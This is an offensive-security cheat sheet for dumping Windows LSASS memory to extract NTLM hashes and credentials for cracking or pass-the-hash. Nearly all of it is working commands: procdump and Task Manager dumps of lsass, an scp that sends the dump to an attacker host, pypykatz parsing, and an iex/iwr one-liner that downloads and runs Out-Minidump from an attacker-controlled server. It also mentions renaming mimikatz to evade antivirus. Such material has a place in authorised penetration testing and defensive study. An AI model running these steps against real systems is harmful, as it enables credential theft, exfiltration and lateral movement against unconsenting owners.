Extract NTLM hashes and credentials from LSASS or remote SMB sessions. Requires administrator rights and SeDebugPrivilege on the target in most cases.

# LSASS Dumping

## Overview

LSASS holds credentials for users logged into the host. Dumps support offline cracking or pass-the-hash.

Prerequisites:
    whoami /priv          SeDebugPrivilege enabled
    Run from elevated Command Prompt or PowerShell

## Commands

Credential Guard check:
    $DevGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
    if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
    if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}

Task Manager (GUI):
    Details > right click lsass.exe > Create dump file
    scp lsass.DMP kali@<attacker IP>:/tmp/
    pypykatz lsa minidump /tmp/lsass.DMP

ProcDump:
    curl https://live.sysinternals.com/tools/procdump.exe -o procdump.exe
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    tasklist | findstr lsass
    procdump.exe -accepteula -ma <PID> lsass.dmp

PowerSploit Out-Minidump:

    python3 -m http.server 80
    iex (iwr -UseBasicParsing http://<attacker IP>/Out-Minidump.ps1); Get-Process lsass | Out-Minidump

## Validation / False Positives

Credential Guard or PPL blocks many userland dumps — document the control and what was attempted.
An empty mimikatz output may mean no interactive logon session — try after a user logs in or use --lsa remotely.
Rename-only AV bypass for mimikatz is fragile — confirm hashes in output before reporting.
